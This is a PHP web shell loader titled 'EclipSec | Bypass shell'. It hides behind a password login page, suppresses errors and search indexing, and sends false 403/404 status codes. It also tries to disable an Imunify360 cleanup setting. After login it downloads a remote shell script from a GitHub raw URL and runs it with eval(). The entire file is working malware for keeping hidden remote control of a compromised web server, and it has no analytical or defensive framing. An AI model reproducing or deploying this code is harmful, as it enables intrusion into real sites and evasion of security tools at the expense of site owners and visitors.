<?php
header("X-Robots-Tag: noindex, nofollow", true);
ini_set('display_errors', 0);
session_start();
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input_password = $_POST['password'];
        $stored_hash = '$2a$12$jKHqNhh3JxYgSP9RdWqH8uo5T0m5H.J/vzgI8tZMxm8OFj4nL4R4i';
        if (password_verify($input_password, $stored_hash)) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error_message = 'access denied!!!!.';
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EclipSec | Bypass shell</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                font-family: 'Courier New', Courier, monospace;
                background-color: #000;
                color: #00ff00;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                overflow: hidden;
            }

            .container {
                text-align: center;
                width: 100%;
                max-width: 400px;
                padding: 20px;
                border: 2px solid #00ff00;
                border-radius: 10px;
                box-sizing: border-box;
            }

            .title {
                font-size: 24px;
                margin-bottom: 20px;
                word-wrap: break-word;
            }

            .error-message {
                color: red;
                margin-top: 15px;
                word-wrap: break-word;
            }

            .success-message {
                color: green;
                margin-top: 15px;
                word-wrap: break-word;
            }

            input[type="password"] {
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                margin-bottom: 20px;
                border: 1px solid #00ff00;
                border-radius: 5px;
                background-color: #000;
                color: #00ff00;
                box-sizing: border-box;
            }

            input[type="submit"] {
                display: block;
                margin: 0 auto;
                background-color: #00ff00;
                color: #000;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
            }

            input[type="submit"]:hover {
                background-color: #00cc00;
            }

            @media (max-width: 480px) {
                .container {
                    padding: 15px;
                }

                .title {
                    font-size: 20px;
                }

                input[type="submit"] {
                    font-size: 14px;
                    padding: 8px 16px;
                }
            }
        </style>
    </head>
    <body>                                                                                              
        <div class="container">
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⡇⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⣸⡄⠀⡰⣧⠀⠀⠀⡇⠀⠀⠀⠀⡀⠀⠀
    ⠀⠀⠀⠀⠈⢧⣀⣨⣵⣾⣷⣿⠮⢵⣯⣧⣤⢯⡇⠀⢀⣠⠞⠀⠀⠀
    ⠀⠀⠀⣠⠶⠋⠉⣿⠿⣥⣿⣿⣧⡆⢰⡏⠛⠷⣿⣯⣿⣧⣤⣴⠋⠁
    ⠠⠴⠟⠃⠀⠀⠀⢻⣦⣤⣄⣀⣠⣤⠟⠁⠀⠀⠀⠈⠉⠍⠉⠉⠉⠉
    ⠀⠀⠀⠐⠒⠒⠦⠤⣬⠭⣟⣛⣛⣋⣀⡠⠤⢖⣊⣩⠤⠄⠀⠀⠀
            ⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁
            <h1 class="title">System Access</h1>
            <?php if (!empty($error_message)): ?>
                <p class="error-message"><?php echo $error_message; ?></p>
            <?php endif; ?>
            <form method="post">
                <label for="password">Masukkan Password:</label><br>
                <input type="password" id="password" name="password" required><br>
                <input type="submit" value="Submit">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
$url = 'https://raw.githubusercontent.com/eclibesec/eclipse_shell/refs/heads/main/eclipse_shell.php';
$nomi = file_get_contents($url);
eval('?>' . $nomi);
?>
